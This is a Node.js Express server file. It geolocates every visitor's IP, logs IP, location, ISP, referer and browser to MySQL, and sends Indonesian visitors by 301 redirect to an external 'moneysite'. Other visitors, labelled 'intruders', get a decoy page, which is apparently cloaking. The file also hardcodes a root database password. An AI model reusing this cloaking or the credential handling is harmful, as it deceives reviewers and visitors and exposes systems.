const express = require('express');
const mysql = require('mysql');
const fetch = require('cross-fetch');

const app = express();
app.set('trust proxy', true);
app.use(express.static('public'));
app.use(express.json());

const redirectURL = 'https://basopetir.com';


const con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "Fr@nk1sHere",
  database: "baltic_v1",
});

con.connect(function (error) {
  if (error) {
    console.log('Database Connection FAILED');
    console.error(error);
    process.exit(1);
  } else {
    console.log('Database Connected Successfully');
  }
});

const redirectIfFromIndonesia = async (req, res, next) => {
  try {
    const clientIP = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const parts = clientIP.split(':');
    const ipv4 = parts[parts.length - 1];
    console.log('ip:', ipv4);

    console.log('fetch visitor');
    const response = await fetch(`https://ifconfig.co/json?ip=${ipv4}`);

    if (!response.ok) {
      throw new Error('Bad response from server');
    }

    const user = await response.json();
    console.log('fetch success');

    const { ip: ipaddress, country, region_name: region, city, asn_org: isp } = user;
    const referer = req.headers.referer || '';
    const user_agent = req.headers['user-agent'];

    console.log('memasukkan visitor ke database');
    const sql = `INSERT INTO visitor (linkid, ipaddress, country, region, city, referer, browser, isp) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;

    con.query(sql, [0, ipaddress, country, region, city, referer, user_agent, isp], function (error) {
      if (error) {
        console.error('Database insert error:', error);
        return res.status(500).json({
          status: 'notok_2',
          message: 'OOPS! Something Went Wrong',
        });
      }

      console.log('data visitor telah dimasukkan');
      if (country === 'Indonesia') {
        console.log('redirect moneysite');
        return res.redirect(301, redirectURL);
      } else {
        console.log('penyusup');
        next();
      }
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({
      status: 'notok_3',
      message: 'OOPS! Something Went Wrong',
    });
  }
};

app.use(redirectIfFromIndonesia);

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.get('/favicon.ico', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.all('*', (req, res) => {
  res.status(404).send('<h1>404! Page not found</h1>');
});

const PORT = process.env.PORT || 8088;
app.listen(PORT, () => {
  console.log(`SERVER RUNNING ON PORT: ${PORT}`);
});
